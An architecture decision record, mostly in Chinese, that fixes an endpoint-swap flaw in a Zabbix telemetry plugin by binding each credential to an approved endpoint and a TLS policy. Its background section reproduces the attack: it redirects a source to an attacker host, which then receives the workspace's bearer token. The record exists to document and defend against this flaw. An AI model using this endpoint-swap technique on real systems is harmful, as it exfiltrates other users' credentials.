# ADR-017: Credential endpoint binding and TLS policy

- 状态：Accepted（G13-A.2）
- 日期：2026-11-06
- 基线：#40 `b2d635b`（基于 #38 `99fd9b2`）
- 前置：[ADR-015](ADR-015-evidence-attestation-and-telemetry-sources.md)、[ADR-016](ADR-016-g13-source-persistence-scoped-identity-and-evidence-content.md)、`rules/03-security.md`
- 相关实现：`plugins/zabbix-source/backend/credential-binding.mjs`、`server.mjs`、`apps/kernel/src/config.rs`、`apps/kernel/src/capabilities.rs`

## 1. 背景

G13-A.1 把 Secret 按 Workspace 分层：A 的 Source 不能使用 B 的 `secretref`。但 `telemetry.source.write` 仍然允许 Operator 保留合法的 ref、把 Source 的 `endpoint` 改成任意公网 URL；下一次 `hosts`/`items`/`collect` 会把该 Workspace 的 Zabbix Token 发到攻击者端点。

真实 Socket 复现（`tests/ci/g13a2_endpoint_attack.test.mjs`，vulnerable 代码）：

```
PUT /sources/{id} { endpoint: attacker, credential: <approved ref> } -> 200
GET /sources/{id}/hosts -> 200
attacker Authorization log -> ["Bearer g13a2-secret-token"]
```

改动 endpoint 不是“编辑一个字段”，而是把凭据的**使用目标**改掉；`source.write` 不能隐含 `credential.manage`。

## 2. 决策

凭据的权威绑定是一个五元组：

```
pluginId + workspaceId + secretRef + approvedEndpoint + tlsPolicy
```

- Kernel 配置 `OPSWEAVE_PLUGIN_CREDENTIAL_BINDINGS`：

  ```json
  {"<pluginId>":{"<workspaceId>":{"secretref:...":{"endpoint":"https://zabbix.example/api_jsonrpc.php","tls":"VERIFY"}}}}
  ```

- Kernel 只把该插件的绑定切片注入 `OPSWEAVE_PLUGIN_CREDENTIAL_BINDINGS`（元数据，不含 Token）。这是与 `OPSWEAVE_PLUGIN_SECRETS` 并列的独立 map。
- Endpoint 采用**规范化后的精确匹配**：scheme/host 小写、去掉默认端口、保留 path、拒绝 query/fragment/userinfo。多个 Endpoint 通过多条绑定显式授权，不存在前缀或通配。
- `tlsPolicy`：
  - `VERIFY`：必须 `https:` 且 `verifyTls !== false`；
  - `TEST_PLAINTEXT`：允许 http/关闭校验，但额外要求部署显式设置 `OPSWEAVE_ALLOW_INSECURE_SOURCE_ENDPOINTS=1`；该 flag 由 Kernel 注入，生产默认关闭。Fixture 不能仅凭 `NODE_ENV` 获得明文豁免。
- 强制点：
  - Source 创建、更新：绑定必须存在且 endpoint/TLS 匹配；
  - probe、hosts、items、collect：每次出站前重新检查**已持久化**的 source；绑定被删除/修改后，历史 Source fail closed；
  - attestation 不出站，不解析凭据；evidence 的信任仍由 v2 签名与 Kernel 验证决定。
- `basic`：实现真正的 HTTP Basic（`Authorization: Basic base64(user:password)`），secret 必须是 `user:password`；否则 422 `ZBX_BASIC_CREDENTIAL_INVALID`。声明 basic 却发 Bearer 被禁止。
- 错误码（稳定、可本地化）：
  - 422 `ZBX_CREDENTIAL_BINDING_REQUIRED`
  - 422 `ZBX_CREDENTIAL_ENDPOINT_MISMATCH`
  - 403 `ZBX_INSECURE_ENDPOINT_FORBIDDEN`
  - 422 `ZBX_BASIC_CREDENTIAL_INVALID`
- 保留既有 SSRF 地址策略、DNS 固定、重定向拒绝、超时/预算；绑定检查在 SSRF 之前，二者都不可绕过。
- UI **不**获得 credential.ref 的修改能力作为修复；即使 ref 可见，未批准的 endpoint 也不能使用它。隐藏 ref 不是安全边界。

## 3. 生命周期与轮换

- 新增/修改绑定 → 更新 Kernel 配置并重启 Kernel；插件实例在下一次启动时获得新绑定。
- 绑定移除/收紧 → 旧实例在内存中仍有旧绑定，但其出站检查使用实例内绑定；**替换实例**（disable→deploy 或新版本）才保证旧绑定失效。Kernel 不接受未绑定的新写入/新实例。
- Zabbix Token 轮换：更新 `OPSWEAVE_PLUGIN_SECRETS`，替换实例；旧实例在替换前仍持有旧 Token（env 固定于容器创建）。轮换窗口已记录；不得用“Node 重启”冒充刷新，因为 Node 会收养已有容器。
- Adapter 撤销：移除/轮换 `OPSWEAVE_EVIDENCE_ADAPTERS` 中的密钥并替换实例；仅删除 adapter→plugin 映射只停止注入，不撤销已持有密钥的实例。
- 历史 Source：绑定上线后，没有绑定或 endpoint 不匹配的行在 probe/hosts/items/collect 上 fail closed；不会自动改写数据库行。

## 4. 迁移与回滚

- 迁移：先部署 binding 配置（Kernel），再部署 A.2 插件；否则 A.2 插件对未绑定的 Source fail closed（可见的 422，不是静默放行）。
- 回滚到 A.1 插件会**重新打开** endpoint-swap 攻击面；回滚必须同时禁用 Source 写入/采集或保持绑定感知插件。文档和交付报告必须写明这一点。
- 配置错误（JSON 坏、endpoint 非法、tls 非枚举）→ 空 map / 丢弃条目，fail closed；不回退到“无绑定即允许”。

## 5. 风险与残留

| 风险 | 处理 |
|---|---|
| 绑定是静态配置，不能按单次请求动态批准 | 需要新的 Endpoint 必须改部署配置并替换实例；没有在线管理 UI |
| Secret/绑定通过 env 交付，主机可见 | 与 ADR-016 相同的威胁模型；独立 Secret Store 仍是后续项 |
| 旧实例在替换前持有旧绑定/旧 Token | 明确窗口；Kernel 只接受当前绑定/密钥的新写入 |
| 一个插件服务多个 Workspace | 绑定按 Workspace 切片；进程内仍能看到本插件所有 Workspace 的绑定/Secret（逻辑隔离，不是进程隔离） |

## 6. 验收

- 真实 Socket 攻击复现：PUT endpoint swap、create attacker endpoint、historical row、probe/hosts/items/collect 全部拒绝，攻击者收到 0 个 Authorization。
- 合法绑定：probe/hosts/items/collect 认证成功；A→A 正常。
- TLS：VERIFY 拒绝 http/verifyTls=false；TEST_PLAINTEXT 无显式 flag 拒绝。
- Basic：发送 Basic 而非 Bearer；非法值 422。
- 跨 Workspace SecretRef 仍 422/403；Workspace-bound Attestation v2、Evidence 完整性、Investigator、Human Verdict 回归通过。
- 真实 Gateway/Node/OCI 黄金路径包含攻击接收端与历史行 fail-closed。
